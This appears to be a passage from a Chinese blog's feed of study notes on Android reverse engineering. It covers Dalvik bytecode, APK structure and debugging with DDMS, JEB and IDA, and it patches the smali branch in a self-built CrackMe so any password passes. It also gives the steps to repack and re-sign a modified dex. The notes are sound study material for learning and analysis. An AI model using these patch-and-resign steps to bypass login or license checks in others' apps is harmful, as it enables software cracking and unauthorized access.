class="hljs-constructor">String()</span>);<br>                String password = edt_password.get<span class="hljs-constructor">Text()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>;<br>                <span class="hljs-comment">//d1ea8c82fe40032b5f5db149e9d6d103</span><br>                <span class="hljs-keyword">if</span>(!edt_username.get<span class="hljs-constructor">Text()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>.is<span class="hljs-constructor">Empty()</span><span class="hljs-operator"> &amp;&amp; </span>!password.is<span class="hljs-constructor">Empty()</span><span class="hljs-operator"> &amp;&amp; </span>password.equals(username_hash))&#123;<br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Toast</span>.</span></span>make<span class="hljs-constructor">Text(MainActivity.<span class="hljs-params">this</span>, <span class="hljs-string">&quot;登陆成功！&quot;</span>, Toast.LENGTH_SHORT)</span>.show<span class="hljs-literal">()</span>;<br>                &#125;<span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Toast</span>.</span></span>make<span class="hljs-constructor">Text(MainActivity.<span class="hljs-params">this</span>, <span class="hljs-string">&quot;登陆失败！&quot;</span>, Toast.LENGTH_SHORT)</span>.show<span class="hljs-literal">()</span>;<br>                &#125;<br>            &#125;<br>        &#125;);<br>    &#125;<br></code></pre></td></tr></table></figure><p>编译并且在模拟器中运行，</p><p><img src="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/image-20210718184146583.png" alt="image-20210718184146583"></p><p>接下来我们破解这个程序，使用Android_killer打开程序，</p><p><img src="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/image-20210718185017630.png" alt="image-20210718185017630"></p><p>在如图中所示的文件中，找到了判断登录是否成功的代码点，发现cond_0是登录失败，所以我们通过修改smali代码使得无论输入什么都显示密码正确。</p><p><img src="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/image-20210718185144735.png" alt="image-20210718185144735"></p><p>将eqz改为nez，进行重编译，并且安装apk。会发现账号密码随便输入，显示登陆成功。</p><h1 id="Dalvik可执行格式与字节码规范"><a href="#Dalvik可执行格式与字节码规范" class="headerlink" title="Dalvik可执行格式与字节码规范"></a>Dalvik可执行格式与字节码规范</h1><p>Dalvik虚拟机的特点：</p><p><img src="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/image-20210718185954440.png" alt="image-20210718185954440"></p><p>Dalvik虚拟机与java虚拟机的区别：</p><ul><li><p>运行的字节码不同。 java虚拟机运行的是java字节码，Dalvik虚拟机运行的是Dalvik字节码。</p></li><li><p>Dalvik可执行文件的体积更小。</p><p><img src="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/image-20210718190401113.png" alt="image-20210718190401113"></p></li><li><p>虚拟机架构不同。 java基于栈架构，Dalvik虚拟机是基于寄存器架构的。</p></li></ul><p>编译java源文件：</p><p><img src="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/image-20210721114351771.png" alt="image-20210721114351771"></p><p>使用d8命令生成dex文件。dx已经被弃用，使用d8代替。</p><p><code>d8 --output dex Hello.class</code></p><p>使用dexdump查看dalvik字节码：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs smali">s1lenc3@chenmodeMacBook-Pro:base/dex $ dexdump -d classes.dex <br>Processing &#x27;classes.dex&#x27;...<br>Opened &#x27;classes.dex&#x27;, DEX version &#x27;035&#x27;<br>Class <span class="hljs-comment">#0            -</span><br>  Class descriptor <span class="hljs-keyword"> :</span> &#x27;<span class="hljs-class">LHello;</span>&#x27;<br>  Access flags     <span class="hljs-keyword"> :</span> 0x0001 (PUBLIC)<br>  Superclass       <span class="hljs-keyword"> :</span> &#x27;<span class="hljs-class">Ljava/lang/Object;</span>&#x27;<br>  Interfaces        -<br>  Static fields     -<br>  Instance fields   -<br>  Direct methods    -<br>    <span class="hljs-comment">#0              : (in LHello;)</span><br>      name         <span class="hljs-keyword"> :</span> &#x27;&lt;init&gt;&#x27;<br>      type         <span class="hljs-keyword"> :</span> &#x27;()V&#x27;<br>      access       <span class="hljs-keyword"> :</span> 0x10001 (PUBLIC CONSTRUCTOR)<br>      code          -<br>      registers    <span class="hljs-keyword"> :</span> 1<br>      ins          <span class="hljs-keyword"> :</span> 1<br>      outs         <span class="hljs-keyword"> :</span> 1<br>      insns size   <span class="hljs-keyword"> :</span> 4 16-bit code units<br>00016c:                                        |[00016c] Hello.&lt;init&gt;:()V<br>00017c: 7010 0400 0000                         |0000:<span class="hljs-built_in"> invoke-direct </span>&#123;v0&#125;, <span class="hljs-class">Ljava/lang/Object;</span>.&lt;init&gt;:()V // method@0004<br>000182: 0e00                                   |0003:<span class="hljs-built_in"> return-void</span><br><span class="hljs-built_in"></span>      catches      <span class="hljs-keyword"> :</span> (none)<br>      positions    <span class="hljs-keyword"> :</span> <br>        0x0000 line=1<br>      locals       <span class="hljs-keyword"> :</span> <br>        0x0000 - 0x0004 reg=0 this <span class="hljs-class">LHello;</span> <br><br>    <span class="hljs-comment">#1              : (in LHello;)</span><br>      name         <span class="hljs-keyword"> :</span> &#x27;main&#x27;<br>      type         <span class="hljs-keyword"> :</span> &#x27;([<span class="hljs-class">Ljava/lang/String;</span>)V&#x27;<br>      access       <span class="hljs-keyword"> :</span> 0x0009 (PUBLIC STATIC)<br>      code          -<br>      registers    <span class="hljs-keyword"> :</span> 4<br>      ins          <span class="hljs-keyword"> :</span> 1<br>      outs         <span class="hljs-keyword"> :</span> 3<br>      insns size   <span class="hljs-keyword"> :</span> 17 16-bit code units<br>000184:                                        |[000184] Hello.main:([<span class="hljs-class">Ljava/lang/String;</span>)V<br>000194: 2203 0100                              |0000:<span class="hljs-built_in"> new-instance </span>v3, <span class="hljs-class">LHello;</span> // type@0001<br>000198: 7010 0000 0300                         |0002:<span class="hljs-built_in"> invoke-direct </span>&#123;v3&#125;, <span class="hljs-class">LHello;</span>.&lt;init&gt;:()V // method@0000<br>00019e: 6200 0000                              |0005:<span class="hljs-built_in"> sget-object </span>v0, <span class="hljs-class">Ljava/lang/System;</span>.out:<span class="hljs-class">Ljava/io/PrintStream;</span> // field@0000<br>0001a2: 1251                                   |0007:<span class="hljs-built_in"> const/4 </span>v1, <span class="hljs-comment">#int 5 // #5</span><br>0001a4: 1232                                   |0008:<span class="hljs-built_in"> const/4 </span>v2, <span class="hljs-comment">#int 3 // #3</span><br>0001a6: 6e30 0100 1302                         |0009:<span class="hljs-built_in"> invoke-virtual </span>&#123;v3, v1, v2&#125;, <span class="hljs-class">LHello;</span>.foo:(II)I // method@0001<br>0001ac: 0a03                                   |000c:<span class="hljs-built_in"> move-result </span>v3<br>0001ae: 6e20 0300 3000                         |000d:<span class="hljs-built_in"> invoke-virtual </span>&#123;v0, v3&#125;, <span class="hljs-class">Ljava/io/PrintStream;</span>.println:(I)V // method@0003<br>0001b4: 0e00                                   |0010:<span class="hljs-built_in"> return-void</span><br><span class="hljs-built_in"></span>      catches      <span class="hljs-keyword"> :</span> (none)<br>      positions    <span class="hljs-keyword"> :</span> <br>        0x0000 line=7<br>        0x0005 line=8<br>        0x0010 line=9<br>      locals       <span class="hljs-keyword"> :</span> <br>        0x0000 - 0x0011 reg=3 (null) [<span class="hljs-class">Ljava/lang/String;</span> <br><br>  Virtual methods   -<br>    <span class="hljs-comment">#0              : (in LHello;)</span><br>      name         <span class="hljs-keyword"> :</span> &#x27;foo&#x27;<br>      type         <span class="hljs-keyword"> :</span> &#x27;(II)I&#x27;<br>      access       <span class="hljs-keyword"> :</span> 0x0001 (PUBLIC)<br>      code          -<br>      registers    <span class="hljs-keyword"> :</span> 4<br>      ins          <span class="hljs-keyword"> :</span> 3<br>      outs         <span class="hljs-keyword"> :</span> 0<br>      insns size   <span class="hljs-keyword"> :</span> 6 16-bit code units<br>000150:                                        |[000150] Hello.foo:(II)I<br>000160: 9000 0203                              |0000:<span class="hljs-built_in"> add-int </span>v0, v2, v3<br>000164: b132                                   |0002:<span class="hljs-built_in"> sub-int/2addr </span>v2, v3<br>000166: 9200 0002                              |0003:<span class="hljs-built_in"> mul-int </span>v0, v0, v2<br>00016a: 0f00                                   |0005:<span class="hljs-built_in"> return </span>v0<br>      catches      <span class="hljs-keyword"> :</span> (none)<br>      positions    <span class="hljs-keyword"> :</span> <br>        0x0000 line=3<br>      locals       <span class="hljs-keyword"> :</span> <br>        0x0000 - 0x0006 reg=1 this <span class="hljs-class">LHello;</span> <br>        0x0000 - 0x0006 reg=2 (null) I <br>        0x0000 - 0x0006 reg=3 (null) I <br><br>  source_file_idx  <span class="hljs-keyword"> :</span> 12 (hello.java)<br></code></pre></td></tr></table></figure><h2 id="虚拟机的执行流程"><a href="#虚拟机的执行流程" class="headerlink" title="虚拟机的执行流程"></a>虚拟机的执行流程</h2><p>Android系统由Linux内核、函数库、Android运行时、应用程序框架及应用程序组成。Dalvik虚拟机属于Android运行时环境。</p><p><img src="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/android-system-architecture1.jpg" alt="Android系统结构"></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">Android系统启动并加载内核后，立即执行<span class="hljs-keyword">init</span>进程，完成初始化后再读区<span class="hljs-keyword">init</span>.rc文件并启动重要外部程序Zygote。<br>Zygote是Android系统中所有进程的孵化器进程。<br></code></pre></td></tr></table></figure><p><img src="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/image-20210721132932393.png" alt="image-20210721132932393"></p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">即时编译（JIT）又称动态编译，一种在运行时将字节码翻译为机器码的技术。<br>有两种编译方式：<br><span class="hljs-function"><span class="hljs-keyword">method</span>方式：以函数或方法为单位进行编译。</span><br><span class="hljs-function"><span class="hljs-title">trace</span>方式：以<span class="hljs-title">trace</span>为单位进行编译，优先编译“热路径”。</span><br></code></pre></td></tr></table></figure><h2 id="Dalvik语言基础"><a href="#Dalvik语言基础" class="headerlink" title="Dalvik语言基础"></a>Dalvik语言基础</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">dexdump反汇编工具寄存器采用“v”命名法，<span class="hljs-keyword">baksmali反汇编工具寄存器采用“p”和“v”命名法。如果是共同使用的话，v寄存器一般作为局部变量寄存器。</span><br><span class="hljs-keyword"></span>Dalvik寄存器都是<span class="hljs-number">32</span>位的，对于<span class="hljs-number">64</span>位类型，可以使用两个相邻的寄存器来表示。<br>寄存器范围是<span class="hljs-built_in">v0</span>-v65535<br>Dalvik虚拟机为每个进程维护一个调用栈，调用栈的作用之一就是“虚拟”寄存器。<br>Dalvik字节码只有基本类型和引用类型，对象和数组属于引用类型。字节码描述符如下表。<br></code></pre></td></tr></table></figure><p><img src="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/image-20210721140245657.png" alt="image-20210721140245657"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gradle">Ljava<span class="hljs-regexp">/lang/</span>String;相当于java.lang.String<br>[[I相当于<span class="hljs-keyword">int</span>[][]<br>[Ljava<span class="hljs-regexp">/lang/</span>String表示jva中的字符串数组<br>方法：<br>Lpackage<span class="hljs-regexp">/name/</span>ObjectName;-&gt;MethodName(III)Z<br>method(I[[IILjava<span class="hljs-regexp">/lang/</span>String;[Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>String; <br>java形式为：String method(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>[][],<span class="hljs-keyword">int</span>, String, Object[])<br>字段：<br>Lpackage<span class="hljs-regexp">/name/</span>ObjectName;-&gt;FieldName:Ljava<span class="hljs-regexp">/lang/</span>String;<br>类型;-&gt;字段名:字段类型<br></code></pre></td></tr></table></figure><p><strong>Dalvik指令集</strong></p><p><img src="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/image-20210721142447916.png" alt="image-20210721142447916"></p><p>获取字段时，普通字段指令前缀为i，静态字段的指令前缀为s。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">使用adb运行dex文件。<br>java -jar smali.jar ass ..<span class="hljs-regexp">/base/</span>HelloWorld.smali <br>adb shell dalvikvm -cp <span class="hljs-regexp">/data/</span>local<span class="hljs-regexp">/tmp/</span>out.dex HelloWorld<br></code></pre></td></tr></table></figure><h1 id="常见Android文件格式"><a href="#常见Android文件格式" class="headerlink" title="常见Android文件格式"></a>常见Android文件格式</h1><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jar包可以使用jd-gui进行反编译</span><br><span class="hljs-keyword"></span>aar包包含资源文件<br></code></pre></td></tr></table></figure><p>apk是一个压缩文件，后缀改为zip可以解压出来。</p><p><strong>AndroidMainfest.xml</strong></p><p>一些配置清单，名字、版本、权限、引用的库文件等等。找一个apk看看这个文件，就什么都懂了。</p><p><strong>META-INF目录</strong></p><p>存放签名信息，android程序生成release版本的apk需要签名，加密信息应该就保存的这里了。</p><p><strong>res目录</strong></p><p>存放各种资源文件。最终被映射到Android工程中的R文件中，对各种资源会生成对应ID。逆向android主要是找strings.xml，便于定位关键字符串。一般在values文件夹中，layout文件夹是存放的应用界面布局。</p><p><strong>lib目录</strong></p><p>存放依赖的native库文件，.so文件是C/C++写的。可以根据特定目录确定是什么架构的。.so文件在逆向中应用挺多。</p><p><strong>assets目录</strong></p><p>这个文件夹中的文件会原封不动的打包到apk中。</p><p><strong>resources.arsc</strong></p><p>编译后的二进制资源文件的索引。应该就是程序运行，然后从这个文件根据对应ID找到对应的res资源文件。</p><p><strong>classes.dex文件</strong></p><p>java字节码文件，这个文件很重要，可以用jeb等转换成java源码。说到这就不得不提一下几个文件的转换了。</p><p> <img src="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/clipboard-1583806782413.png" alt="img"></p><p>baksmali.jar和smali.jar有时候java自带的老出问题，我是从网上下载的。<a href="https://bitbucket.org/JesusFreke/smali/downloads/">https://bitbucket.org/JesusFreke/smali/downloads/</a></p><p>当然敲命令有点费事，可以去吾爱的爱盘下载android逆向工具包。</p><p><strong>apk打包流程</strong></p><p>将编译模块和依赖项打包成dex文件、将apk packager打包成apk和签名。</p><p><img src="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/image-20210722155918309.png" alt="image-20210722155918309"></p><p><strong>apk安装流程</strong></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl">请求安装apk时会启动packageinstaller.apk，并且接收通过Intent传递过来的APK信息。<br>进入PackageInstallActivity中的onCreate方法，主要PackageUtil中的getPackageInfo方法和initiateInstall方法最为重要。<br><span class="hljs-function"><span class="hljs-title">getPackageInfo</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">initiateInstall</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">startInstallConfirm</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">onClick</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">instalPackage</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">installPackageWithVerification</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">processPendingInstall</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">installlPackageLI</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">scanPackageLI</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">mInstaller</span>.install()-&gt;</span><br></code></pre></td></tr></table></figure><p><strong>Activity 的主要方法</strong></p><p><strong>onClick</strong></p><p>CrackMe类型的题目，重点关注这个方法。</p><p><strong>init和onCreate</strong></p><p>Activity创建时的初始化函数</p><p><strong>BuildConfig和R</strong></p><p>编译时自动添加的资源类，不常用</p><p><strong>Native层与so</strong></p><p>Android原生代码，Linux中的执行代码，C/C++写的，底层是ARM汇编，很重要。</p><p><strong>JNI_ONLOAD</strong></p><p>这个函数是Dalvik虚拟机加载库时的初始化函数。</p><p><strong>动态调试Smali代码演示</strong></p><p>使用adb install xxxxxx.apk</p><p>安装apk。</p><p>拖入apk到jeb中，Ctrl+B下断点。</p><p> 使用adb shell am start -D -n com.droider.crackme0201/.MainActivity   让程序处于等待调试状态</p><p>然后点 调试器-&gt;开始</p><p>附加。断点设在点击事件后。</p><p>然后正常执行app，就会在指定断点处断下来。</p><p>可以查看局部变量。</p><p><img src="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/clipboard-1583806831184.png" alt="img"></p><p>在VM 终端中可以执行指令：</p><p><img src="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/clipboard-1583806844916.png" alt="img"></p><p><img src="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/clipboard-1583806852913.png" alt="img"></p><p>还有很多用法，我也不会用。</p><p>判断跳转:</p><p><img src="/2020/03/10/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/clipboard.png" alt="![img](D:/有道笔记/数据/qq20118A67A04314627D0DF4F3B9EFF13F/7d45d1529d4c41eead3e0d46a2c8f067/clipboard.png)"></p><p>用APKIDE修改 if-nez 为 if-eqz。</p><p>APK破解成功。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>Android逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android动态调试</title>
    <link href="/2020/03/10/Android%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    <url>/2020/03/10/Android%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Android动态调试支持"><a href="#Android动态调试支持" class="headerlink" title="Android动态调试支持"></a>Android动态调试支持</h1><ul><li>dalvik实现了JDWP(Java Debug wire Protocol,Java调试有线协议)，可直接使用支持此协议的调试器来调试Android程序。</li><li>dalvik为JDWP的实现加入了DDM(Dalvik Debug Monitor,Dalvik调试监视器)。具体的实现有DDMS(Dalvik Debug Monitor Server,调试监视器服务)和Eclipse ADT插件。</li><li>系统属性ro.debuggable为1时所有程序都会开启调试(adb shell getprop ro.debuggable检查)，若为0，则会判断AndroidManifest.xml中的debuggable属性。</li></ul><h1 id="DDMS的使用"><a href="#DDMS的使用" class="headerlink" title="DDMS的使用"></a>DDMS的使用</h1><p>Logcat、文件浏览、Method Profiling等。</p><p>Logcat视图相当于<code>adb logcat -s com.droider.jnimethods:V</code></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">adb logcat -s TagName:<span class="hljs-keyword">Type</span><br></code></pre></td></tr></table></figure><h1 id="定位关键代码"><a href="#定位关键代码" class="headerlink" title="定位关键代码"></a>定位关键代码</h1><h2 id="代码注入法"><a href="#代码注入法" class="headerlink" title="代码注入法"></a>代码注入法</h2><p>通过Log输出定位关键代码，甚至破解程序。</p><h2 id="栈跟踪法"><a href="#栈跟踪法" class="headerlink" title="栈跟踪法"></a>栈跟踪法</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs smali">java代码：<br>   <span class="hljs-built_in"> new </span>Exception(<span class="hljs-string">&quot;print trace&quot;</span>).printStackTrace();<br>smali代码:<br>   <span class="hljs-built_in"> new-instance </span>v0, <span class="hljs-class">Ljava/lang/Exception;</span><br>   <span class="hljs-built_in"> const-string </span>v1, <span class="hljs-string">&quot;print trace&quot;</span><br>   <span class="hljs-built_in"> invoke-direct </span>&#123;v0, v1&#125;, <span class="hljs-class">Ljava/lang/Exception;</span>-&gt;&lt;init&gt;(<span class="hljs-class">Ljava/lang/String;</span>)V<br>   <span class="hljs-built_in"> invoke-virtual </span>&#123;v0&#125;, <span class="hljs-class">Ljava/lang/Exception;</span>-&gt;printStackTrace()V<br></code></pre></td></tr></table></figure><p>栈跟踪信息是WARN级别的log</p><h2 id="Method-Profiling"><a href="#Method-Profiling" class="headerlink" title="Method Profiling"></a>Method Profiling</h2><p>相当于Ollydbg的trace功能，跟踪信息。</p><p>通过方法设置跟踪的开始和停止：</p><p><img src="/2020/03/10/Android%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20200311221443847.png" alt="image-20200311221443847"></p><p>smali代码如下：</p><p><img src="/2020/03/10/Android%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20200311221616231.png" alt="image-20200311221616231"></p><p>此方法会在文件下生成trace文件，可以使用SDK目录下的traceview工具打开，使用此方法还需要有SD卡写入权限。</p><h1 id="IDA调试原生程序"><a href="#IDA调试原生程序" class="headerlink" title="IDA调试原生程序"></a>IDA调试原生程序</h1><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">启动android_server文件<br>转发端口 adb forward tcp:<span class="hljs-number">23946</span> tcp:<span class="hljs-number">23946</span><br>设置等待调试 adb <span class="hljs-keyword">shell</span> <span class="hljs-keyword">am</span> start -D -n 包名/类名<br>IDA attach进程<br>jdb附加 jdb -connect <span class="hljs-keyword">com</span>.<span class="hljs-keyword">sun</span>.jdi.SocketAttach:<span class="hljs-built_in">hostname</span>=localhost,port=<span class="hljs-number">8700</span><br>列出进程 <span class="hljs-keyword">ps</span> -aux<br>杀死进程 kill -s <span class="hljs-number">9</span> PID (其中-s <span class="hljs-number">9</span> 制定了传递给进程的信号是９。强制、尽快终止进程。)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>Android逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AndroidNDK逆向</title>
    <link href="/2020/03/10/AndroidNDK%E9%80%86%E5%90%91/"/>
    <url>/2020/03/10/AndroidNDK%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h2 id="原生C程序逆向分析"><a href="#原生C程序逆向分析" class="headerlink" title="原生C程序逆向分析"></a>原生C程序逆向分析</h2><p>.plt段主要是用于函数重定位的。<br>.text段就是程序代码段。</p><ul><li>反汇编。<br>  objdump -S filename  </li></ul><p>本以为这节不用记录，感觉都能看懂，汇编看多了就会了，但是竟然发现了惊天大秘密。看下边：<br><img src="/2020/03/10/AndroidNDK%E9%80%86%E5%90%91/image-20200310102238328.png" alt="image-20200310102238328"><br>一直以为PC是指下一条指令，但是在这里ADDLS这条指令，我发现怎么都不可能按照正常逻辑执行，我郁闷了1个小时，终于找到了源头。<br>[<a href="https://blog.csdn.net/lee244868149/article/details/49488575]">https://blog.csdn.net/lee244868149/article/details/49488575]</a>  </p><p>PC需要取指、译码、执行三步，每次取指完就指向下一条指令即PC+4。然后取指完后又指向下一条指令，即PC+8。<br><img src="/2020/03/10/AndroidNDK%E9%80%86%E5%90%91/image-20200310102307647.png" alt="image-20200310102307647"></p><p>所以第一条指令执行的时候，PC=PC+8.</p><h5 id="除法"><a href="#除法" class="headerlink" title="除法"></a>除法</h5><h4 id="编译优化"><a href="#编译优化" class="headerlink" title="编译优化"></a>编译优化</h4><p>gcc -O 可以进行优化。5个等级0,1,2,3,s  </p><h2 id="C-逆向分析"><a href="#C-逆向分析" class="headerlink" title="C++逆向分析"></a>C++逆向分析</h2><p>C++是神，分析不来。。。awsl</p><h2 id="JNI-API逆向分析"><a href="#JNI-API逆向分析" class="headerlink" title="JNI API逆向分析"></a>JNI API逆向分析</h2><p>JNINativeInterface:  </p><pre><code>JNI本地接口，一个接口函数指针表，有JNI接口的函数指针。  </code></pre><p>JNIInvokeInterface:</p><pre><code>JNI调用接口，有3个保留项，5个函数指针。  </code></pre><p><img src="/2020/03/10/AndroidNDK%E9%80%86%E5%90%91/image-20200310102327161.png" alt="image-20200310102327161"><br>JNIEnv结构体的第一个字段就是JNINativeInterface，IDA分析时不会识别API，将函数的第一个参数类型改为JNIEnv类型就可以识别了，或者导入JNIEnv结构体。<br>对照着结构体看，可以知道IDA中相对寄存器的偏移处就是API函数。  </p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>Android逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android静态分析</title>
    <link href="/2020/03/10/Android%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    <url>/2020/03/10/Android%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h3 id="IDA破解实例-定位关键代码"><a href="#IDA破解实例-定位关键代码" class="headerlink" title="IDA破解实例-定位关键代码"></a>IDA破解实例-定位关键代码</h3><h4 id="搜索特征字符串"><a href="#搜索特征字符串" class="headerlink" title="搜索特征字符串"></a>搜索特征字符串</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> ctrl+s定位strings段<br><span class="hljs-bullet">2.</span> alt+t快捷键搜索文本字符串<br></code></pre></td></tr></table></figure><h4 id="搜索API"><a href="#搜索API" class="headerlink" title="搜索API"></a>搜索API</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 定位到code段<br><span class="hljs-bullet">2.</span> 搜索API名称<br></code></pre></td></tr></table></figure><h4 id="搜索方法名"><a href="#搜索方法名" class="headerlink" title="搜索方法名"></a>搜索方法名</h4><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">在<span class="hljs-keyword">Exports</span>窗口中搜索方法名<br></code></pre></td></tr></table></figure><blockquote><p>if-eqz的opcode是0x38<br>if-nez的opcode是0x39<br>return的opcode是0x0f</p></blockquote><h4 id="修改dex，替换apk中的dex"><a href="#修改dex，替换apk中的dex" class="headerlink" title="修改dex，替换apk中的dex"></a>修改dex，替换apk中的dex</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 使用dexFixer更新checksum<br><span class="hljs-bullet">2.</span> 将修改后的dex重新放回apk包里<br><span class="hljs-bullet">3.</span> 删除META-INF文件夹<br><span class="hljs-bullet">4.</span> 对apk重签名即可安装<br></code></pre></td></tr></table></figure><h4 id="终止程序"><a href="#终止程序" class="headerlink" 